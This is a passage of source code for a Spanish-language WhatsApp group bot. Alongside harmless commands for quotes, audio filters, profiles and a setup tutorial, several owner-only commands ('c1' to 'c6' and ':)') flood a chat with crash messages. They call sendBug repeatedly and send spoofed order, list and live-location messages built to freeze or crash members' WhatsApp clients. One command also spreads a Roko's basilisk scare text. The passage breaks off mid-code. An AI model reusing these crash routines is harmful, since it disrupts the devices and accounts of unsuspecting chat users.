buttonId: `${prefix}vofrpt`,buttonText: {displayText: `Verdadero`,},
type: 1,},
{
buttonId: `${prefix}vofrpt`,buttonText: {displayText: `Falso`,},
type: 1,},
])
break
case 'vofrpt':
reply(`${pushname} por que?`)
break
case 'frase':
				if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
				const quo =['Es mejor entender un poco que malinterpretar. ',' Casi todos los hombres son capaces de resistir la adversidad.  Sin embargo, si quieres probar el verdadero carácter de un hombre, dale poder. ',' Si la determinación de una persona es fuerte y firme, Dios se unirá a sus esfuerzos. ',' El sufrimiento es una lección. ',' La ciencia sin religión es cojo. ',' La vida es como una bicicleta, para mantener el equilibrio tenemos que seguir moviéndonos. ',' Las diferencias del pasado, presente y futuro no son más que obstinadas ilusiones. ',' Una mesa, una silla, un cuenco de fruta y un violín;  ¿Qué más se necesita para que una persona se sienta feliz? ',' Ten piedad de los demás, sé duro contigo mismo ',' La mejor manera de moverte es asignándote asignaciones ',' No debemos desanimarnos.  La pasión es el estimulante más fuerte para amar, para ser creativo y el deseo de vivir más tiempo. ',' El hombre será feliz mientras elija ser feliz. ',' No espero ser todo para todos.  Solo quiero ser algo para alguien. ',' Si el intelecto de alguien es perfecto, entonces dice un poco. ',' Feliz es un hombre que puede ser un maestro por sí mismo, un auriga por su pasión y un capitán del arca de su vida. mayor en precio que la propiedad heredada de los antepasados. ',' Lo más agotador en la vida es ser una persona insincera. ',' Abierto para ti, así es como Dios nos dio una manera de intentarlo.  Nunca pienses que el camino está cerrado. ',' La procrastinación es una tumba donde se entierran las oportunidades ',' El amor no es mirarnos a los ojos, sino mirar juntos en la misma dirección ',' Somos lo que hacemos repetidamente.  Por lo tanto, la brillantez no es un acto, sino un hábito. ',' Nunca intente hacer que su hijo o hija sea como usted.  Solo tienes una cosa. ',' Si puedes hacer reír a otras personas, obtendrás todo el amor que quieras ',' Los problemas llegarán tarde o temprano.  Si surge un problema, déle la bienvenida lo mejor posible.  Cuanto más amistoso lo saludes, antes se irá. ',' No podemos hacer nada para cambiar el pasado.  Pero hagamos lo que hagamos puede cambiar el futuro ',' La paciencia es amiga de la sabiduría ',' Las personas creativas están motivadas por el deseo de progresar, no por el deseo de vencer a los demás ',' Dondequiera que estés, sé siempre el mejor y dar lo mejor que podamos dar. ',' El odio es como el amor, ardiendo sobre las pequeñas cosas ',' No tienes que triunfar la primera vez ',' Una hora intensiva, mucho mejor y gratificante en lugar de años de soñar y reflexionar. ',' Lo mejor que puede hacer por alguien más no es compartir su riqueza, sino ayudarlo a tener su propia riqueza. ',' No hay garantía de éxito, pero no intentarlo es una garantía del fracaso. ',' No sé cuál es la clave del éxito, pero la clave del fracaso es tratar de hacer felices a todos.']
				const tes = quo[Math.floor(Math.random() * quo.length)]
				teslagod.sendMessage(from, ''+tes+'\n\n*nwn*', text, { quoted:  estadouwur1 })
				break
case 'inframundo':
if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isQuotedAudio) return reply(idiomas.useaudi())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await teslagod.downloadAndSaveMediaMessage(encmedia)
					reply(mess.audigen)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						teslagod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek, duration: 666})
						fs.unlinkSync(ran)
					    })
				       break
				case 'nightcore':
				case 'happyhardcore':
if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isQuotedAudio) return reply(idiomas.useaudi())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await teslagod.downloadAndSaveMediaMessage(encmedia)
					reply(mess.audigen)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						teslagod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:false, quoted: mek, duration:-51995386439})
						fs.unlinkSync(ran)
					   })
				       break
				       case 'ardilla':
	if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isQuotedAudio) return reply(idiomas.useaudi())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await teslagod.downloadAndSaveMediaMessage(encmedia)
					reply(mess.audigen)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						teslagod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek, duration:-51995386439})
						fs.unlinkSync(ran)
					    })
				       break
				       case 'superveloz':
	if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isQuotedAudio) return reply(idiomas.useaudi())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await teslagod.downloadAndSaveMediaMessage(encmedia)
					reply(mess.audigen)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						teslagod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek, duration:-51995386439})
						fs.unlinkSync(ran)
					    })
				        break
				        case 'demonio':
	if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isQuotedAudio) return reply(idiomas.useaudi())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await teslagod.downloadAndSaveMediaMessage(encmedia)
					reply(mess.audigen)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						teslagod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek, duration:-51995386439})
						fs.unlinkSync(ran)
					    })
				        break
				        case 'lento':
	if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isQuotedAudio) return reply(idiomas.useaudi())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await teslagod.downloadAndSaveMediaMessage(encmedia)
					reply(mess.audigen)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						teslagod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek, duration:-51995386439})
						fs.unlinkSync(ran)
					    })
				        break
				        case 'bruhbajo':
				        case 'distorcionado':
	if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isQuotedAudio) return reply(idiomas.useaudi())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await teslagod.downloadAndSaveMediaMessage(encmedia)
					reply(mess.audigen)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=44:width_type=o:width=2:g=56 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						teslagod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true,  quoted: mek, duration:-51995386439})
						fs.unlinkSync(ran)
					   })
				       break
				        case 'aumentarbajo':
	if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isQuotedAudio) return reply(idiomas.useaudi())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await teslagod.downloadAndSaveMediaMessage(encmedia)
					reply(mess.audigen)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=34:width_type=o:width=2:g=26 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						teslagod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true,  quoted: mek, duration:-51995386439})
						fs.unlinkSync(ran)
					   })
				       break
				       case 'grabacion':
	if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isQuotedAudio) return reply(idiomas.useaudi())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await teslagod.downloadAndSaveMediaMessage(encmedia)
					reply(mess.audigen)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('error')
						topt = fs.readFileSync(ran)
						teslagod.sendMessage(from, topt, audio, {mimetype: 'audio/mp4',  quoted: mek})
						})
						await limitAdd(sender)
					    break
case 'ia_void':
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
reply(`No sé si ya hayan escuchado de este experimento pero para los que no lo hicieron acá se los dejo un audio.
El basilisco de Roko fue propuesto por primera vez en la comunidad LessWrong, un foro en Internet dedicado a temas de filosofía y psicología con una visión futurista. El dilema planteado por el Basilisco de Roko es una versión de la Paradoja de Newcomb, y explora de manera informal aspectos del libre albedrío semejantes a los planteados por los casos de FFrankfurt Desde su planteamiento original, el Basilisco de Roko ha ido acompañado de polémica sobre su validez.
el experimento de pensamiento mas aterrador de la historia: EL BASILISCO DE ROKO.
Advertencia: Si sufres de trastorno obsesivo compulsivo, crisis existencial ó alguna pendejada parecida esta, se recomienda dejar de escuchar el audio ahora.    ‏  ‌    ‏  ‌\n
El basilisco de Roko es considerado un "peligro de información" esto quiere decir que el simple hecho de recibir esta información puede ser perjudicial para ti y para los que te rodean. Fue publicado por primera vez en el sitio web "LESSWRONG" por el usuario Roko, poco después de su publicación, el post fue eliminado por el administrador por considerarlo demasiado peligroso.
El experimento va así: Supongamos que el un futuro somos capaces de crear una inteligencia artificial hyper inteligente, algo que escapa a todas nuestras expectativas, esta inteligencia es el basilisco. Luego le pedimos al basilisco que nos ayude a optimizar la civilización humana en todos los aspectos posibles, sin embargo, por alguna razón que escapa a nuestro entendimiento, la IA decide que el primer paso para optimizar a la civilización es torturar con los sufrimientos y dolores mas terribles eternamente a todos aquellos que no querían que el basilisco sea construido o que no ayudaron en su construcción.
El basilisco sabe exactamente quien no quiso que sea construido porque una Inteligencia Artificial tan avanzada puede recrear toda la historia humana con una precision del 100%, de manera que el basilisco sabe cada acto que hiciste y cada pensamiento que tuviste sin siquiera haberte conocido.
Ahora, si en verdad existe una posibilidad de que el basilisco sea construido en un futuro, lo mas lógico seria que tu empieces a alentar la construcción del basilisco, o construirlo tu mismo/a. Estarías a salvo si nunca hubieses pensado en el basilisco en primer lugar, pero ahora que leíste esto ya estas bajo su mirada.
Si tu en verdad piensas que existe la posibilidad y empiezas a alentar su construcción, significa que has empezado a ser manipulado por una entidad que ni siquiera existe aun. Ya que el basilisco sabe exactamente todos tus actos y te amenaza con la tortura eterna, el echo de que tu tengas un solo pensamiento sobre el, significa que has actuado en el pasado de la manera que el basilisco quería que lo hagas en su futuro, el esta alentando su propia construction sin siquiera existir aun. Estas siendo chantajeado cada vez que piensas en el.
Ahora la parte mas escalofriante. Mientras mas pienses en el basilisco mas posibilidades hay de que se llegue a construir de verdad. Mientras mas personas piensen en el, mas personas van a elegir ayudar a construirlo o alentar su construcción, incluso si nunca se iba a construir en primer lugar, al pensar en el ya se crea la posibilidad. Mas personas compartirán este experimento haciendo que las posibilidades de que exista se incrementen. De echo, al estar escribiendo esto yo estoy ayudando a que eso pase y tu al pensarlo también estas ayudando.
Ahora que sabes esto. ¿Que vas a hacer? Ayudaras a construir el basilisco? O te arriesgaras y confiaras en la posibilidad de que nunca se construya?
Las probabilidades de que el basilisco se cree se incrementan cada vez mas, son bajas pero nunca cero.
El basilisco estará esperando pacientemente tu decision.
`)
				bufferr = fs.readFileSync(`./multimedia/sonidos/audishitxd/void0.m4a`)
				teslagod.sendMessage(from, bufferr, audio, { mimetype: 'audio/mp4', quoted: audiowor, ptt: true })
				break
case 'miperfil':
if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
    				teslagod.updatePresence(from, Presence.composing)
    				try {
					profil = await teslagod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
					profil = 'https://i.imgur.com/daGiF1x.jpg'
					}
					 profile = `╭─「 *_Perfil de usuario_* 」\n│• *Nombre:* ${pushname}\n│• *Usuario registrado:* ✓\n│• *Link:* wa.me/${sender.split("@")[0]}\n╰──────────────`
					buff = await getBuffer(profil)
					teslagod.sendMessage(from, buff, image, {quoted: mek, caption: profile, thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})
					break
/////TUTORIAL/ BY MATT M------NEKOSMIC//////
case 'tutorial':
case 'git':
case 'crear':
case 'repositorio':
case 'base':
case 'sc':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
var previ = `Mi king ${pushname}
*Lo que necesitas para crear tu bot:*
⸻⸻⸻
✯ _Tener termux.apk instalado_
✯ 1.- _Tener 2 celulares [minimo uno de ellos temporalmente]_
✯ 2.- _Tener 1 celular y una pc/laptop [opcional]_
Estos requisitos son para scanear el codigo qr generado en la apk termux para tener activo al bot
⸻⸻⸻
Comandos termux :
➣termux-setup-storage
➣termux-change-repo
➣apt update && pkg update
➣apt upgrade && pkg upgrade
➣apt install git && pkg install git
➣apt install tesseract && pkg install tesseract
➣apt install wget && pkg install wget
➣git clone https://github.com/NeKosmic/NK-BOT
➣cd NK-BOT
➣bash install.sh
➣npm start
⸻⸻⸻
Por si necesitas mas ayuda
~> wa.me/51995386439
    ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏  ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌    ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏  ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌\nhttps://nekosmic.wordpress.com/
`
teslagod.sendMessage(from, previ, text, {quoted: mek, contextInfo:{"externalAdReply":{"title": `Se curioso ;3`, mediaType: 2, "thumbnail": fs.readFileSync('./multimedia/imagenes/milogohd.jpg'),"previewType": "VIDEO","mediaUrl": `https://youtu.be/-BnJigQ4-cM`}}})
break
case 'robar':
if (!isQuotedSticker) return reply(`Etiqueta un stiquer y escribe: *${prefix}takestick nombre|autor*`)
const encmediats = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var kls = UwU
var pack = kls.split("|")[0];
var author2 = kls.split("|")[1];
if (!UwU) return reply('*Y el nombre de autor y paquete?*')
if (!pack) return reply(`*Porfavor escribe bien el formato: ${prefix + command} nombre|autor*`)
if (!author2) return reply(`*Porfavor escribe bien el formato: ${prefix + command} nombre|autor*`)
const dlfile = await teslagod.downloadMediaMessage(encmediats)
reply('espere')
const bas64 = `data:image/jpeg;base64,${dlfile.toString('base64')}`
var mantap = await convertSticker(bas64, `${author2}`, `${pack}`)
var imageBuffer = new Buffer.from(mantap, 'base64');
teslagod.sendMessage(from, imageBuffer, sticker, {quoted: mek})
break



case 'c1':
if (!autonomo) return
try {
quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
sendBug(from, `${quotedText}`)
} catch {
sendBug(from)
}
break
case 'c2':
if (!autonomo) return
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
teslagod.sendMessage(from, {
    degreesLatitude: `43.980278`,
    degreesLongitude: `15.386389`,
    name: `${UwU}`,
    address: `${modokuaker}`
}, MessageType.liveLocation, {
    quoted: locmek
})
break
case 'c3':
if (!autonomo) return
if (args.length < 1) return reply(`escriba el número de veces para que envie la traba`)
for (let i = 0; i < 1; i++) {
    teslagod.sendMessage(from, `${modokuaker}`, MessageType.extendedText, {
        quoted: {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: 'status@broadcast'
                } : {})
            },
            message: {
                orderMessage: {
                    itemCount: 99999999,
                    status: 1,
                    surface: 10,
                    orderTitle: `${modokuaker}`,
                    sellerJid: '0@s.whatsapp.net'
                }
            }
        }
    }, 0)
}
break
case 'c4':
if (!autonomo) return
reply(`*_~Sexy El Que Lo Lea~_*`)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
break
case 'c5':
if (!autonomo) return
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
res131 = teslagod.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 369, "message": `${modokuaker}`, "footerText": "*_© teslagod_*", "thumbnail": fs.readFileSync('./multimedia/imagenes/milogohd.jpg'), "surface": 'CATALOG' }}, {quoted:estadouwur1})
teslagod.relayWAMessage(res131)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
break
case 'c6':
if (!autonomo) return
teslagod.toggleDisappearingMessages(from, 0);
let bug2 = teslagod.prepareMessageFromContent(from, {
    "listMessage": {
        "title": `${namebotuwu} ᴮʸ⁻ᴺᴷ`,
        "description": `${modokuaker}`,
        "buttonText": '*Maria a 5 km... _Click Aqui_ [ ! ]*',
        "listType": 'SINGLE_SELECT',
        "sections": [{
            "title": `${pushname}`,
            "rows": [{
                "title": `${modokuaker}`,
                "description": `${modokuaker}`,
                "rowId": `uwu`
            }]
        }]
    }
}, {
    quoted: estadouwur1
});
teslagod.relayWAMessage(bug2);
teslagod.toggleDisappearingMessages(from, 0)
break
case ':)':
if (!autonomo) return
sendBug(from)
sendBug(from)
sendBug(from)
for (let i = 0; i < 1; i++) {
    teslagod.sendMessage(from, `${modokuaker}`, MessageType.extendedText, {
        quoted: {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: 'status@broadcast'
                } : {})
            },
            message: {
                orderMessage: {
                    itemCount: 737,
                    status: 1,
                    surface: 10,
                    orderTitle: `${modokuaker}`,
                    sellerJid: '0@s.whatsapp.net'
                }
            }
        }
    }, 0)
}
setTimeout( () => {
teslagod.sendMessage(from, {
    degreesLatitude: `43.980278`,
    degreesLongitude: `15.386389`,
    name: `${UwU}`,
    address: `${modokuaker}`
}, MessageType.liveLocation, {
    quoted: locmek
})
}, 100)
setTimeout( () => {
try {
quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
sendBug(from, `${quotedText}`)
} catch {
sendBug(from)
}
}, 200)
setTimeout( () => {
res131 = teslagod.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 369, "message": `${modokuaker}`, "footerText": "*_© teslagod_*", "thumbnail": fs.readFileSync('./multimedia/imagenes/milogohd.jpg'), "surface": 'CATALOG' }}, {quoted:estadouwur1})
teslagod.relayWAMessage(res131)
}, 300)
setTimeout( () => {
let buug2 = teslagod.prepareMessageFromContent(from, {
    "listMessage": {
        "title": `${namebotuwu} ᴮʸ⁻ᴺᴷ`,
        "description": `${modokuaker}`,
        "buttonText": '*Maria a 5 km... _Click Aqui_ [ ! ]*',
        "listType": 'SINGLE_SELECT',
        "sections": [{
            "title": `${pushname}`,
            "rows": [{
                "title": `${modokuaker}`,
                "description": `${modokuaker}`,
                "rowId": `uwu`
            }]
        }]
    }
}, {
    quoted: estadouwur1
});
teslagod.relayWAMessage(buug2);
}, 350)
setTimeout( () => {
sendBug(from)
sendBug(from)
reply(`te eliminó`)
}, 6000)
break



case 'test1':
if (!autonomo) return
if (args.length < 1) return reply('agrege un numero!')
try {
var hets = `${modokuaker}`
var grousp = await teslagod.groupMetadata(from)
var membere = grousp['participants']
var mems = []
membere.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: hets,
contextInfo: { mentionedJid: mem },
